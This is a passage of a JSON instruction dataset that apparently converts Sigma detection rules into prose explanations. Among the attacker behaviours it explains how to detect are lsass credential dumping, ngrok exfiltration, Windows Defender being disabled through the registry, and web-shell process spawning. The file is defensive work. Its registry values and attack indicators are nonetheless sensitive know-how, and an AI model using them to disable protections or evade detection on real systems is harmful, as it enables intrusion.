    "output": "In order to detect S3 Browser utility creating IAM User or AccessKey, you should focus on monitoring AWS CloudTrail logs. Specifically, attention should be given to logs that originate from the IAM (Identity and Access Management) service, identifiable by the event source `iam.amazonaws.com`. Key events to watch for include 'CreateUser' and 'CreateAccessKey'. It's critical to filter these events further by scrutinizing the user agent strings for mentions of 'S3 Browser'. This method precisely targets scenarios where the S3 Browser, a tool often used for managing Amazon S3 buckets, is utilized in potentially unauthorized activities such as creating new IAM users or access keys. It's important to note, however, that there may be legitimate scenarios where the S3 Browser is used for these purposes, which would be considered false positives in the context of this monitoring strategy. The severity of this detection strategy is considered high due to the significant impact that unauthorized IAM user or access key creation can have on AWS account security.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "S3 Browser utility creating IAM User or AccessKey.",
      "answer": "In order to detect S3 Browser utility creating IAM User or AccessKey, you should focus on monitoring AWS CloudTrail logs. Specifically, attention should be given to logs that originate from the IAM (Identity and Access Management) service, identifiable by the event source `iam.amazonaws.com`. Key events to watch for include 'CreateUser' and 'CreateAccessKey'. It's critical to filter these events further by scrutinizing the user agent strings for mentions of 'S3 Browser'. This method precisely targets scenarios where the S3 Browser, a tool often used for managing Amazon S3 buckets, is utilized in potentially unauthorized activities such as creating new IAM users or access keys. It's important to note, however, that there may be legitimate scenarios where the S3 Browser is used for these purposes, which would be considered false positives in the context of this monitoring strategy. The severity of this detection strategy is considered high due to the significant impact that unauthorized IAM user or access key creation can have on AWS account security."
    }
  },
  {
    "instruction": "Explain how should I detect the following: Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n",
    "context": "",
    "output": "In order to detect adversaries attempting to enumerate browser bookmarks to learn more about compromised hosts, which can reveal personal information about users or details about internal network resources, you should monitor Windows PowerShell script activities, specifically looking for the use of the `Get-ChildItem` cmdlet with a combination of parameters. These parameters include `-Recurse`, which allows the script to search through directories recursively; `-Path`, which specifies the directory path to search; `-Filter Bookmarks`, indicating the search specifically targets bookmark files; `-ErrorAction SilentlyContinue`, which suppresses error messages; and `-Force`, enabling the script to perform actions that it would otherwise not be allowed to, such as accessing hidden or system files. This monitoring requires that Script Block Logging be enabled on the Windows system, to ensure that detailed records of PowerShell script executions are kept. The detection of this particular pattern of script execution is associated with a low level of alert due to the potential for false positives, as there may be legitimate reasons for scripts to access bookmarks in this manner.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "Adversaries may enumerate browser bookmarks to learn more about compromised hosts.\nBrowser bookmarks may reveal personal information about users (ex: banking sites, interests, social media, etc.) as well as details about\ninternal network resources such as servers, tools/dashboards, or other related infrastructure.\n",
      "answer": "In order to detect adversaries attempting to enumerate browser bookmarks to learn more about compromised hosts, which can reveal personal information about users or details about internal network resources, you should monitor Windows PowerShell script activities, specifically looking for the use of the `Get-ChildItem` cmdlet with a combination of parameters. These parameters include `-Recurse`, which allows the script to search through directories recursively; `-Path`, which specifies the directory path to search; `-Filter Bookmarks`, indicating the search specifically targets bookmark files; `-ErrorAction SilentlyContinue`, which suppresses error messages; and `-Force`, enabling the script to perform actions that it would otherwise not be allowed to, such as accessing hidden or system files. This monitoring requires that Script Block Logging be enabled on the Windows system, to ensure that detailed records of PowerShell script executions are kept. The detection of this particular pattern of script execution is associated with a low level of alert due to the potential for false positives, as there may be legitimate reasons for scripts to access bookmarks in this manner."
    }
  },
  {
    "instruction": "How to detect: creation of a new service using powershell.",
    "context": "",
    "output": "In order to detect the creation of a new service using powershell, you should: Focus on the creation of processes on Windows systems. Specifically, monitor the use of PowerShell commands that involve the creation of new services. Look for instances where the command line contains both 'New-Service' and '-BinaryPathName' as these indicate the creation of a new service with a specified binary path, which is a common technique used by attackers to persist on a system or execute malicious processes. Be aware that there are legitimate scenarios where administrators or software installations may use this command for valid reasons, therefore, this activity should be considered low level unless other suspicious activities are observed. This method correlates with tactics and techniques such as Persistence and Privilege Escalation by making unauthorized changes to the system\u2019s services.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "creation of a new service using powershell.",
      "answer": "In order to detect the creation of a new service using powershell, you should: Focus on the creation of processes on Windows systems. Specifically, monitor the use of PowerShell commands that involve the creation of new services. Look for instances where the command line contains both 'New-Service' and '-BinaryPathName' as these indicate the creation of a new service with a specified binary path, which is a common technique used by attackers to persist on a system or execute malicious processes. Be aware that there are legitimate scenarios where administrators or software installations may use this command for valid reasons, therefore, this activity should be considered low level unless other suspicious activities are observed. This method correlates with tactics and techniques such as Persistence and Privilege Escalation by making unauthorized changes to the system\u2019s services."
    }
  },
  {
    "instruction": "How to detect: execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
    "context": "",
    "output": "In order to detect execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action, you should: Monitor Windows process creation logs for instances where the \"odbcconf.exe\" process is initiated. Specifically, lookout for cases where the image path ends with '\\odbcconf.exe' or where the original file name matches 'odbcconf.exe'. Additionally, pay close attention to the command line arguments, particularly the presence of '-f' or '/f' which indicates an attempt to load a file, and the inclusion of '.rsp' in the command line, pointing towards the use of a response file. This method of execution is associated with tactics that aim at leveraging legitimate system tools for malicious purposes, extending to areas such as persistence, execution, and potentially privilege escalation, given the nature of the odbcconf tool on Windows systems. Note that while this detection strategy is valuable, there might be legitimate uses of response files with \"odbcconf.exe\", so any hits should be carefully investigated to confirm their nature and adjust the monitoring filters accordingly to minimize false positives.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action.",
      "answer": "In order to detect execution of \"odbcconf\" with the \"-f\" flag in order to load a response file which might contain a malicious action, you should: Monitor Windows process creation logs for instances where the \"odbcconf.exe\" process is initiated. Specifically, lookout for cases where the image path ends with '\\odbcconf.exe' or where the original file name matches 'odbcconf.exe'. Additionally, pay close attention to the command line arguments, particularly the presence of '-f' or '/f' which indicates an attempt to load a file, and the inclusion of '.rsp' in the command line, pointing towards the use of a response file. This method of execution is associated with tactics that aim at leveraging legitimate system tools for malicious purposes, extending to areas such as persistence, execution, and potentially privilege escalation, given the nature of the odbcconf tool on Windows systems. Note that while this detection strategy is valuable, there might be legitimate uses of response files with \"odbcconf.exe\", so any hits should be carefully investigated to confirm their nature and adjust the monitoring filters accordingly to minimize false positives."
    }
  },
  {
    "instruction": "Explain how should I detect the following: flashplayer update from an unofficial location",
    "context": "",
    "output": "In order to detect a flashplayer update from an unofficial location, you should: Monitor proxy logs for specific patterns in URIs indicating an attempt to download Flash Player updates. Look for accesses to URLs containing '/flash_install.php' or ending with '/install_flash_player.exe'. These accesses suggest an attempt to install Flash Player, potentially mimicking a legitimate update mechanism. However, to accurately identify malicious activity, it's crucial to exclude any accesses to these resources hosted on domains ending with '.adobe.com', as this domain is associated with the legitimate Adobe Flash Player updates. The focus on excluding the official Adobe domain helps in reducing false positives, particularly concerning URLs that are not known locations for Flash Player downloads. The significance of this monitoring approach is heightened not only by the high level of risk associated with unauthorized Flash Player installations\u2014which could lead to malware infections or other security breaches\u2014but also categorizes the activity based on exploitation and possibly delivery of malicious payloads, considering it under tactics like execution, persistence, or privilege escalation if further leveraged by attackers.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "flashplayer update from an unofficial location",
      "answer": "In order to detect a flashplayer update from an unofficial location, you should: Monitor proxy logs for specific patterns in URIs indicating an attempt to download Flash Player updates. Look for accesses to URLs containing '/flash_install.php' or ending with '/install_flash_player.exe'. These accesses suggest an attempt to install Flash Player, potentially mimicking a legitimate update mechanism. However, to accurately identify malicious activity, it's crucial to exclude any accesses to these resources hosted on domains ending with '.adobe.com', as this domain is associated with the legitimate Adobe Flash Player updates. The focus on excluding the official Adobe domain helps in reducing false positives, particularly concerning URLs that are not known locations for Flash Player downloads. The significance of this monitoring approach is heightened not only by the high level of risk associated with unauthorized Flash Player installations\u2014which could lead to malware infections or other security breaches\u2014but also categorizes the activity based on exploitation and possibly delivery of malicious payloads, considering it under tactics like execution, persistence, or privilege escalation if further leveraged by attackers."
    }
  },
  {
    "instruction": "Can you explain how to detect: when an admin share is mounted using net.exe",
    "context": "",
    "output": "Certainly!\n\nIn order to detect when an admin share is mounted using net.exe, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where either 'net.exe' or 'net1.exe' are executed, as these are command-line utilities often leveraged for network tasks, including the mounting of administrator shares. The detection is based on two main criteria: the name of the executable (where it ends with '\\net.exe' or '\\net1.exe') and the command line arguments that include 'use' in conjunction with a pattern that matches a Universal Naming Convention (UNC) path to an admin share (indicated by '\\\\\\\\*\\\\*$'). It's important to note that while this kind of activity can sometimes be legitimate and performed by administrators, it might also indicate a potential security threat, such as an attacker trying to gain unauthorized access to admin shares. Therefore, any detection at a medium level of confidence should be investigated, keeping in mind that legitimate administrative activities could also trigger this alert.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when an admin share is mounted using net.exe",
      "answer": "In order to detect when an admin share is mounted using net.exe, you should focus on monitoring process creation events within Windows environments. Specifically, pay attention to instances where either 'net.exe' or 'net1.exe' are executed, as these are command-line utilities often leveraged for network tasks, including the mounting of administrator shares. The detection is based on two main criteria: the name of the executable (where it ends with '\\net.exe' or '\\net1.exe') and the command line arguments that include 'use' in conjunction with a pattern that matches a Universal Naming Convention (UNC) path to an admin share (indicated by '\\\\\\\\*\\\\*$'). It's important to note that while this kind of activity can sometimes be legitimate and performed by administrators, it might also indicate a potential security threat, such as an attacker trying to gain unauthorized access to admin shares. Therefore, any detection at a medium level of confidence should be investigated, keeping in mind that legitimate administrative activities could also trigger this alert."
    }
  },
  {
    "instruction": "How can I detect: when attackers or tools disable Windows Defender functionalities via the Windows registry",
    "context": "",
    "output": "In order to detect when attackers or tools disable Windows Defender functionalities via the Windows registry, you should monitor the Windows registry for specific changes that indicate such activities. These activities can be identified by watching for the 'SetValue' event type within the registry, specifically targeting modifications in the Windows Defender configurations. The changes of interest involve modifications to registry paths that include: \n\n1. Directories related to Windows Defender and Windows Defender Security Center settings under the '\\SOFTWARE\\Microsoft\\Windows Defender\\' and '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\'.\n2. Potential modifications to key configurations that are critical for the functioning of Windows Defender's antivirus and anti-spyware capabilities, real-time protection features, reporting mechanisms, and spyware protections. These changes can be in the form of enabling or disabling functionalities such as disabling anti-virus, anti-spyware, behavior monitoring, intrusion prevention system, IOAV protection (Input Output Anti-Virus), on-access protection, real-time monitoring, script scanning, enhanced notifications, block at first seen in SpyNet, and tamper protection features among others.\n\nChanges are considered suspicious if they involve setting certain registry values that effectively disable these protections. For instance, setting a registry value to 'DWORD (0x00000001)' in paths that end with configurations like '\\DisableAntiSpyware', '\\Real-Time Protection\\DisableRealtimeMonitoring' signifies the disabling of these respective features. Conversely, setting a value to 'DWORD (0x00000000)' in paths related to enabling protection features like '\\App and Browser protection\\DisallowExploitProtectionOverride' or '\\Windows Defender Exploit Guard\\Controlled Folder Access\\EnableControlledFolderAccess' could be legitimate actions but also need monitoring as they might indicate attempts to tamper with the system's default security posture.\n\nMonitoring these changes is critical for maintaining the integrity of Windows Defender as a key component of the system's security posture against malware and other threats. However, it's important to consider that some of these registry changes could result from legitimate administrative actions via the Windows Defender interface. Therefore, a high level of vigilance in the analysis of these events is recommended to differentiate between legitimate and malicious activities.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "when attackers or tools disable Windows Defender functionalities via the Windows registry",
      "answer": "In order to detect when attackers or tools disable Windows Defender functionalities via the Windows registry, you should monitor the Windows registry for specific changes that indicate such activities. These activities can be identified by watching for the 'SetValue' event type within the registry, specifically targeting modifications in the Windows Defender configurations. The changes of interest involve modifications to registry paths that include: \n\n1. Directories related to Windows Defender and Windows Defender Security Center settings under the '\\SOFTWARE\\Microsoft\\Windows Defender\\' and '\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\'.\n2. Potential modifications to key configurations that are critical for the functioning of Windows Defender's antivirus and anti-spyware capabilities, real-time protection features, reporting mechanisms, and spyware protections. These changes can be in the form of enabling or disabling functionalities such as disabling anti-virus, anti-spyware, behavior monitoring, intrusion prevention system, IOAV protection (Input Output Anti-Virus), on-access protection, real-time monitoring, script scanning, enhanced notifications, block at first seen in SpyNet, and tamper protection features among others.\n\nChanges are considered suspicious if they involve setting certain registry values that effectively disable these protections. For instance, setting a registry value to 'DWORD (0x00000001)' in paths that end with configurations like '\\DisableAntiSpyware', '\\Real-Time Protection\\DisableRealtimeMonitoring' signifies the disabling of these respective features. Conversely, setting a value to 'DWORD (0x00000000)' in paths related to enabling protection features like '\\App and Browser protection\\DisallowExploitProtectionOverride' or '\\Windows Defender Exploit Guard\\Controlled Folder Access\\EnableControlledFolderAccess' could be legitimate actions but also need monitoring as they might indicate attempts to tamper with the system's default security posture.\n\nMonitoring these changes is critical for maintaining the integrity of Windows Defender as a key component of the system's security posture against malware and other threats. However, it's important to consider that some of these registry changes could result from legitimate administrative actions via the Windows Defender interface. Therefore, a high level of vigilance in the analysis of these events is recommended to differentiate between legitimate and malicious activities."
    }
  },
  {
    "instruction": "How can I detect: usage of namp/zenmap. Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation",
    "context": "",
    "output": "In order to detect the usage of nmap/zenmap, where adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation, you should: Focus on monitoring process creation logs within Windows environments. Look for the execution of processes where the image name ends with '\\nmap.exe' or '\\zennmap.exe', or where the original file name is explicitly 'nmap.exe' or 'zennmap.exe'. It's important to note that legitimate network administration activities may involve the use of these tools, so a potential source of false positives could be machines used by network administrators. The level of concern for these detections is considered high, underscoring the potential risk associated with the observed activity in relation to reconnaissance and vulnerability scanning efforts by malicious actors.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "usage of namp/zenmap. Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation",
      "answer": "In order to detect the usage of nmap/zenmap, where adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation, you should: Focus on monitoring process creation logs within Windows environments. Look for the execution of processes where the image name ends with '\\nmap.exe' or '\\zennmap.exe', or where the original file name is explicitly 'nmap.exe' or 'zennmap.exe'. It's important to note that legitimate network administration activities may involve the use of these tools, so a potential source of false positives could be machines used by network administrators. The level of concern for these detections is considered high, underscoring the potential risk associated with the observed activity in relation to reconnaissance and vulnerability scanning efforts by malicious actors."
    }
  },
  {
    "instruction": "How can I detect: web servers that spawn shell processes which could be the result of a successfully placed web shell or another attack",
    "context": "",
    "output": "In order to detect web servers that spawn shell processes which could be the result of a successfully placed web shell or another attack, you should:\n\nMonitor the creation of process events on Windows systems, specifically focusing on processes that originate from common web server executable files such as 'w3wp.exe', 'php.exe', 'php-cgi.exe', 'nginx.exe', 'httpd.exe', 'caddy.exe', 'ws_TomcatService.exe', 'tomcat.exe', and 'UMWorkerProcess.exe'. These executables are typical of web servers and their spawning processes can be indicative of web-related activities. Additionally, pay attention to processes related to Apache Tomcat which are initiated by 'java.exe' or 'javaw.exe' when they include references like '-tomcat-' in their parent image names, or commands associated with Tomcat operations, such as the use of 'catalina.jar', 'CATALINA_HOME', or variations of 'catalina.home' in their command lines.\n\nFurther scrutiny is required when these web server processes spawn children processes known for their command execution capabilities or utilities that are commonly abused by attackers. This includes but is not limited to 'cmd.exe', 'cscript.exe', 'sh.exe', 'bash.exe', 'powershell.exe', 'powershell_ise.exe', 'pwsh.exe', as well as a wide range of system utilities and command-line tools such as 'bitsadmin.exe', 'certutil.exe', 'net.exe', and 'wmic.exe', among others.\n\nIt\u2019s crucial to apply filters to reduce false positives. This involves ignoring command lines that end with specific trustworthy paths or contain known safe commands, like those associated with trustworthy applications like 'ManageEngine ADManager'. Even though certain legitimate web applications might spawn these shell processes under normal operations, these events should be treated with high suspicion and investigated accordingly to rule out or confirm malicious activities.\n\nTherefore, monitoring for such potentially suspicious activity entails capturing details of the command lines involved and the parent command lines that initiated the process, to provide context and assist in the differentiation between legitimate and malicious activities, thereby ensuring the security and integrity of web servers.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "web servers that spawn shell processes which could be the result of a successfully placed web shell or another attack",
      "answer": "In order to detect web servers that spawn shell processes which could be the result of a successfully placed web shell or another attack, you should:\n\nMonitor the creation of process events on Windows systems, specifically focusing on processes that originate from common web server executable files such as 'w3wp.exe', 'php.exe', 'php-cgi.exe', 'nginx.exe', 'httpd.exe', 'caddy.exe', 'ws_TomcatService.exe', 'tomcat.exe', and 'UMWorkerProcess.exe'. These executables are typical of web servers and their spawning processes can be indicative of web-related activities. Additionally, pay attention to processes related to Apache Tomcat which are initiated by 'java.exe' or 'javaw.exe' when they include references like '-tomcat-' in their parent image names, or commands associated with Tomcat operations, such as the use of 'catalina.jar', 'CATALINA_HOME', or variations of 'catalina.home' in their command lines.\n\nFurther scrutiny is required when these web server processes spawn children processes known for their command execution capabilities or utilities that are commonly abused by attackers. This includes but is not limited to 'cmd.exe', 'cscript.exe', 'sh.exe', 'bash.exe', 'powershell.exe', 'powershell_ise.exe', 'pwsh.exe', as well as a wide range of system utilities and command-line tools such as 'bitsadmin.exe', 'certutil.exe', 'net.exe', and 'wmic.exe', among others.\n\nIt\u2019s crucial to apply filters to reduce false positives. This involves ignoring command lines that end with specific trustworthy paths or contain known safe commands, like those associated with trustworthy applications like 'ManageEngine ADManager'. Even though certain legitimate web applications might spawn these shell processes under normal operations, these events should be treated with high suspicion and investigated accordingly to rule out or confirm malicious activities.\n\nTherefore, monitoring for such potentially suspicious activity entails capturing details of the command lines involved and the parent command lines that initiated the process, to provide context and assist in the differentiation between legitimate and malicious activities, thereby ensuring the security and integrity of web servers."
    }
  },
  {
    "instruction": "How can I detect: password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage.\nThe process in field Process is the malicious program. A single execution can lead to hundreds of events.\n",
    "context": "",
    "output": "In order to detect password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage, you should: focus on monitoring events within Windows systems specifically looking for the creation of remote threads that target the lsass.exe process. Key indicators of such suspicious activity include instances where the TargetImage field ends with '\\lsass.exe' and the StartModule field is empty. It is important to be aware that antivirus products may sometimes generate false positives. The activity is classified at a high severity level due to the critical nature of the lsass.exe process, which is central to the security subsystem of Windows and often targeted by attackers seeking to extract sensitive credential information. Monitoring for these events is essential in identifying potential password dumping attempts, which can involve the malicious program creating hundreds of events in a single execution as it tries to manipulate the lsass.exe process. Identifying these attempts early can prevent unauthorized access and potential breaches.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage.\nThe process in field Process is the malicious program. A single execution can lead to hundreds of events.\n",
      "answer": "In order to detect password dumper activity by monitoring remote thread creation EventID 8 in combination with the lsass.exe process as TargetImage, you should: focus on monitoring events within Windows systems specifically looking for the creation of remote threads that target the lsass.exe process. Key indicators of such suspicious activity include instances where the TargetImage field ends with '\\lsass.exe' and the StartModule field is empty. It is important to be aware that antivirus products may sometimes generate false positives. The activity is classified at a high severity level due to the critical nature of the lsass.exe process, which is central to the security subsystem of Windows and often targeted by attackers seeking to extract sensitive credential information. Monitoring for these events is essential in identifying potential password dumping attempts, which can involve the malicious program creating hundreds of events in a single execution as it tries to manipulate the lsass.exe process. Identifying these attempts early can prevent unauthorized access and potential breaches."
    }
  },
  {
    "instruction": "Can you explain how to detect: an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
    "context": "",
    "output": "Certainly!\n\nIn order to detect an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for communications with specific ngrok tunneling endpoint hostnames. These hostnames include 'tunnel.us.ngrok.com', 'tunnel.eu.ngrok.com', 'tunnel.ap.ngrok.com', 'tunnel.au.ngrok.com', 'tunnel.sa.ngrok.com', 'tunnel.jp.ngrok.com', and 'tunnel.in.ngrok.com'. When such activity is detected, it may indicate an attempt at unauthorized data exfiltration. However, bear in mind that there could be legitimate uses of ngrok, so each detection should be investigated to confirm malicious activity. This activity is considered of high importance due to the potential for it to indicate data being exfiltrated by malicious actors, bypassing usual data transmission safeguards.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors",
      "answer": "In order to detect an executable accessing an ngrok tunneling endpoint, which could be a sign of forbidden exfiltration of data exfiltration by malicious actors, you should: Monitor network connections on Windows systems for communications with specific ngrok tunneling endpoint hostnames. These hostnames include 'tunnel.us.ngrok.com', 'tunnel.eu.ngrok.com', 'tunnel.ap.ngrok.com', 'tunnel.au.ngrok.com', 'tunnel.sa.ngrok.com', 'tunnel.jp.ngrok.com', and 'tunnel.in.ngrok.com'. When such activity is detected, it may indicate an attempt at unauthorized data exfiltration. However, bear in mind that there could be legitimate uses of ngrok, so each detection should be investigated to confirm malicious activity. This activity is considered of high importance due to the potential for it to indicate data being exfiltrated by malicious actors, bypassing usual data transmission safeguards."
    }
  },
  {
    "instruction": "How to detect: DLL's Loaded Via Word Containing VBA Macros Executing WMI Commands",
    "context": "",
    "output": "In order to detect DLLs loaded via Word containing VBA macros executing WMI commands, you should: Monitor Windows systems for the loading of specific dynamic-link libraries (DLLs) associated with Windows Management Instrumentation (WMI) commands. These DLLs include 'wmiutils.dll', 'wbemcomn.dll', 'wbemprox.dll', and 'wbemdisp.dll'. The detection focuses on instances where these DLLs are loaded by Microsoft Office applications, specifically Word ('winword.exe'), PowerPoint ('powerpnt.exe'), Excel ('excel.exe'), and Outlook ('outlook.exe'). Such activity may indicate the execution of WMI commands through VBA macros contained within these applications, which could signify malicious behavior. It's important to note that while this detection can provide valuable insights, it may also yield false positives and requires further investigation for accurate analysis. This monitoring approach falls under the detection category of image load events in Windows products, serving as an informational level of alert to possibly suspicious activity involving WMI.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "DLL's Loaded Via Word Containing VBA Macros Executing WMI Commands",
      "answer": "In order to detect DLLs loaded via Word containing VBA macros executing WMI commands, you should: Monitor Windows systems for the loading of specific dynamic-link libraries (DLLs) associated with Windows Management Instrumentation (WMI) commands. These DLLs include 'wmiutils.dll', 'wbemcomn.dll', 'wbemprox.dll', and 'wbemdisp.dll'. The detection focuses on instances where these DLLs are loaded by Microsoft Office applications, specifically Word ('winword.exe'), PowerPoint ('powerpnt.exe'), Excel ('excel.exe'), and Outlook ('outlook.exe'). Such activity may indicate the execution of WMI commands through VBA macros contained within these applications, which could signify malicious behavior. It's important to note that while this detection can provide valuable insights, it may also yield false positives and requires further investigation for accurate analysis. This monitoring approach falls under the detection category of image load events in Windows products, serving as an informational level of alert to possibly suspicious activity involving WMI."
    }
  },
  {
    "instruction": "Can you explain how to detect: execution of \"wget\" to download a \".zip\" or \".rar\" files from \"temp.sh\". As seen used by UNC4841 during their Barracuda ESG zero day exploitation.",
    "context": "",
    "output": "Certainly!\n\nIn order to detect execution of \"wget\" to download a \".zip\" or \".rar\" files from \"temp.sh\", as seen used by UNC4841 during their Barracuda ESG zero day exploitation, you should: Monitor Linux systems for process creation events specifically focusing on instances where the \"wget\" utility is executed. Look for command lines that contain the specific URL \"https://temp.sh/\", which is a known indicator of this attack type. Additionally, ensure that the command line ends with either \".rar\" or \".zip\", suggesting the download of a compressed file, which is a common tactic used in the delivery of malicious payloads. This behavior is significant and should be regarded with a high level of suspicion, given its association with a known threat actor's method of operation.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "execution of \"wget\" to download a \".zip\" or \".rar\" files from \"temp.sh\". As seen used by UNC4841 during their Barracuda ESG zero day exploitation.",
      "answer": "In order to detect execution of \"wget\" to download a \".zip\" or \".rar\" files from \"temp.sh\", as seen used by UNC4841 during their Barracuda ESG zero day exploitation, you should: Monitor Linux systems for process creation events specifically focusing on instances where the \"wget\" utility is executed. Look for command lines that contain the specific URL \"https://temp.sh/\", which is a known indicator of this attack type. Additionally, ensure that the command line ends with either \".rar\" or \".zip\", suggesting the download of a compressed file, which is a common tactic used in the delivery of malicious payloads. This behavior is significant and should be regarded with a high level of suspicion, given its association with a known threat actor's method of operation."
    }
  },
  {
    "instruction": "How can I detect: potential local file read vulnerability in JVM based apps.\nIf the exceptions are caused due to user input and contain path traversal payloads then it's a red flag.\n",
    "context": "",
    "output": "In order to detect potential local file read vulnerability in JVM based apps, you should: Focus on monitoring application error logs specifically from Java Virtual Machine (JVM) based applications. The collected error logs must have a log level of ERROR or higher. Look for indicators of a local file read vulnerability. These indicators include the presence of 'FileNotFoundException' within the error logs or paths that contain the sequence '/../../..', which suggests an attempt at directory traversal. These specific patterns are critical in identifying potentially malicious activities where an attacker tries to exploit local file read vulnerabilities, particularly when such patterns are part of malicious user inputs aimed at triggering path traversal vulnerabilities.\n\nConsider that not all detections are inherently malicious. Some matches might be false positives, such as benign occurrences due to application bugs. Hence, it\u2019s important to treat these detections with a high level of scrutiny and investigate further to ascertain the context and the intent behind these exceptions.\n\nThe overarching goal is to enhance the security posture of JVM-based applications by efficiently identifying and responding to possible exploitation attempts that leverage local file read vulnerabilities facilitated by user inputs containing path traversal attempts.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "potential local file read vulnerability in JVM based apps.\nIf the exceptions are caused due to user input and contain path traversal payloads then it's a red flag.\n",
      "answer": "In order to detect potential local file read vulnerability in JVM based apps, you should: Focus on monitoring application error logs specifically from Java Virtual Machine (JVM) based applications. The collected error logs must have a log level of ERROR or higher. Look for indicators of a local file read vulnerability. These indicators include the presence of 'FileNotFoundException' within the error logs or paths that contain the sequence '/../../..', which suggests an attempt at directory traversal. These specific patterns are critical in identifying potentially malicious activities where an attacker tries to exploit local file read vulnerabilities, particularly when such patterns are part of malicious user inputs aimed at triggering path traversal vulnerabilities.\n\nConsider that not all detections are inherently malicious. Some matches might be false positives, such as benign occurrences due to application bugs. Hence, it\u2019s important to treat these detections with a high level of scrutiny and investigate further to ascertain the context and the intent behind these exceptions.\n\nThe overarching goal is to enhance the security posture of JVM-based applications by efficiently identifying and responding to possible exploitation attempts that leverage local file read vulnerabilities facilitated by user inputs containing path traversal attempts."
    }
  },
  {
    "instruction": "How to detect: This event was observed on the target host during lateral movement. The process name within the event contains the process spawned post compromise. Account Name within the event contains the compromised user account name. This event should to be correlated with 4624 and 4688 for further intrusion context.",
    "context": "",
    "output": "In order to detect an event that was observed on the target host during lateral movement, where the process name within the event contains the process spawned post-compromise, and the Account Name within the event contains the compromised user account name, you should focus on monitoring Windows security logs. Specifically, you need to look out for logs with the Event ID 4674, which indicates an attempt to perform an operation on a secured object. The object in question should be a file type object (`ObjectType: 'File'`) located at '\\Device\\ConDrv'. This path is critical as it suggests an operation performed on a console driver, which is not typical behavior and might indicate malicious activity such as a backdoor or a method used by attackers to execute commands.\n\nThis detection should be considered in conjunction with other events, notably those with Event IDs 4624 (an account successfully logged on) and 4688 (a new process has been created), to provide additional context to the lateral movement attempt. Doing so could help identify patterns of compromised accounts and processes being spawned that are not part of the regular operational baseline. However, it is also crucial to be aware that such activities could be mistaken for legal administrative actions. Therefore, the security level associated with this detection is considered low until further correlation with other suspicious activities is made.\n\nMonitoring for such activities is essential in identifying and mitigating lateral movement within a network, which attackers often use to expand their foothold after compromising an initial target. Identifying the use of unusual paths like '\\Device\\ConDrv' and correlating it with account logons and process creation events will significantly enhance the detection of malicious activities within an affected environment.",
    "category": "SigmaFlan",
    "instruction_type": "rule_goal_to_description",
    "parsed_raw_data": {
      "question": "This event was observed on the target host during lateral movement. The process name within the event contains the process spawned post compromise. Account Name within the event contains the compromised user account name. This event should to be correlated with 4624 and 4688 for further intrusion context.",
      "answer": "In order to detect an event that was observed on the target host during lateral movement, where the process name within the event contains the process spawned post-compromise, and the Account Name within the event contains the compromised user account name, you should focus on monitoring Windows security logs. Specifically, you need to look out for logs with the Event ID 4674, which indicates an attempt to perform an operation on a secured object. The object in question should be a file type object (`ObjectType: 'File'`) located at '\\Device\\ConDrv'. This path is critical as it suggests an operation performed on a console driver, which is not typical behavior and might indicate malicious activity such as a backdoor or a method used by attackers to execute commands.\n\nThis detection should be considered in conjunction with other events, notably those with Event IDs 4624 (an account successfully logged on) and 4688 (a new process has been created), to provide additional context to the lateral movement attempt. Doing so could help identify patterns of compromised accounts and processes being spawned that are not part of the regular operational baseline. However, it is also crucial to be aware that such activities could be mistaken for legal administrative actions. Therefore, the security level associated with this detection is considered low until further correlation with other suspicious activities is made.\n\nMonitoring for such activities is essential in identifying and mitigating lateral movement within a network, which attackers often use to expand their foothold after compromising an initial target. Identifying the use of unusual paths like '\\Device\\ConDrv' and correlating it with account logons and process creation events will significantly enhance the detection of malicious activities within an affected environment."
    }
  },
  {
    "instruction": "How to detect: suspicious execution of a utility to convert Windows 3.x .grp files or for persistence purposes by malicious software or actors",
    "context": "",
